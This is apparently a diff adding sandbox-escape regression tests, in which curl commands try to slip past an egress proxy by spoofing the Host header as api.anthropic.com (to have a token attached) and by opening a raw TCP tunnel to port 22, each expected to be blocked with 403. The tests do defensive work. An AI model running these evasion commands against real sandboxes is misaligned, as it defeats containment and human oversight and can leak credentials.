@@ -286,6 +286,40 @@ class TestSandboxEscape(unittest.TestCase):
                 f"stdout={r.stdout!r} stderr={r.stderr!r}",
             )
 
+        with self.subTest(attack="CONNECT to unlisted host, Host names a listed one"):
+            # The tunnel itself must be refused, or the request inside it is
+            # policed as api.anthropic.com (and gets its token) but sent to
+            # example.com.
+            r = self._bottle.exec(  # type: ignore
+                "curl --silent --insecure --max-time 8 --output /dev/null "
+                "--write-out '%{http_connect}' "
+                "-H 'Host: api.anthropic.com' https://example.com/"
+            )
+            self.assertEqual(
+                "403", (r.stdout or "").strip(),
+                f"CONNECT to an unlisted host should get 403; "
+                f"stdout={r.stdout!r} stderr={r.stderr!r}",
+            )
+
+        with self.subTest(attack="plain HTTP to unlisted host, Host names a listed one"):
+            r = self._bottle.exec(  # type: ignore
+                "curl --silent --show-error --max-time 8 "
+                "--write-out '\\nHTTP_CODE:%{http_code}' "
+                "-H 'Host: api.anthropic.com' http://example.com/"
+            )
+            self._assert_sandbox_block("plain HTTP host spoof", r)
+
+        with self.subTest(attack="raw TCP tunnel to unlisted host"):
+            r = self._bottle.exec(  # type: ignore
+                "curl --silent --proxytunnel --max-time 8 --output /dev/null "
+                "--write-out '%{http_connect}' telnet://example.com:22 </dev/null"
+            )
+            self.assertEqual(
+                "403", (r.stdout or "").strip(),
+                f"CONNECT for a raw TCP tunnel should get 403; "
+                f"stdout={r.stdout!r} stderr={r.stderr!r}",
+            )
+
     # ---- attack 3: HTTP exfil shapes ---------------------------------
 
     # Sandbox-block signature: egress returns HTTP 403 on policy
